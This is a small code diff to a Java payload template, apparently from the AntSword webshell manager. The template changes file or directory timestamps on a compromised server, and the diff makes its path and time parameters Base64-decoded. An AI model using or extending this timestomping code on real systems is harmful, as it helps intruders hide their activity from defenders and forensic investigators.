@@ -8,8 +8,8 @@ import java.text.SimpleDateFormat;
 public class Retime extends Template {
     @Override
     public String run() throws Exception {
-        String z1 = getParam("antswordargpath");
-        String z2 = getParam("antswordargtime");
+        String z1 = new String(this.Base64DecodeToByte("antswordargpath"), this.cs);
+        String z2 = new String(this.Base64DecodeToByte("antswordargtime"), this.cs);
         return ModifyFileOrDirTimeCode(z1, z2);
 
     }
